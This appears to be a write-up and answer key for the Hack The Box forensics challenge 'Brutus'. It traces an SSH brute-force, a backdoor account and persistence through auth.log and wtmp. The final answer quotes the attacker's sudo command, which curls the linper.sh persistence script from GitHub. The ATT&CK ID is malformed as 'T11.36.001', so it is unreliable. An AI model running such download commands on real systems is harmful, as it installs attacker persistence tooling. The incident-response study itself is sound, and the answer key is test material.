---
title: Brutus
aliases:
  - Brutus
tags:
  - VeryEasy
  - HTB
  - Sherlock
---
# Introduction
---
In this very easy Sherlock, you will familiarize yourself with Unix **auth.log** and **wtmp logs**. We'll explore a scenario where a Confluence server was **brute-forced** via its **SSH service**. After gaining access to the server, the attacker performed additional activities, which we can track using **auth.log**. Although auth.log is primarily used for brute-force analysis, we will delve into the full potential of this artifact in our investigation, including aspects of privilege escalation, persistence, and even some visibility into command execution.

---

![[images/Pasted image 20250416152753.png]]

>[!Question 1]
>**Analyze the auth.log. What is the IP address used by the attacker to carry out a brute force attack?**
>
>**Ans.** 65.2.161.68

![[images/Pasted image 20250416153047.png]]
>[!Question 2]
>**The bruteforce attempts were successful and attacker gained access to an account on the server. What is the username of the account?**
>
>**Ans.** root


![[images/Pasted image 20250416153501.png]]
>[!Question 3]
>**Identify the timestamp when the attacker logged in manually to the server to carry out their objectives. The login time will be different than the authentication time, and can be found in the wtmp artifact.**
>
>**Ans.** 2024-03-06 06:32:45

![[images/Pasted image 20250416153624.png]]

>[!Question 4]
>**SSH login sessions are tracked and assigned a session number upon login. What is the session number assigned to the attacker's session for the user account from Question 2?**
>**Ans.** 37


![[images/Pasted image 20250416153917.png]]

>[!Question 5]
>**The attacker added a new user as part of their persistence strategy on the server and gave this new user account higher privileges. What is the name of this account?**
>
>**Ans.** cyberjunkie

![[images/Pasted image 20250416154203.png]]
>[!Question 6]
>**What is the MITRE ATT&CK sub-technique ID used for persistence by creating a new account?**
>
>**Ans.** T11.36.001

![[images/Pasted image 20250416154727.png]]
>[!Question 7]
>**What time did the attacker's first SSH session end according to auth.log?**
>
>**Ans.** 2024-03-06 06:37:24


![[images/Pasted image 20250416154930.png]]
>[!Question 8]
>**The attacker logged into their backdoor account and utilized their higher privileges to download a script. What is the full command executed using sudo?**
>
>**Ans.** /usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh
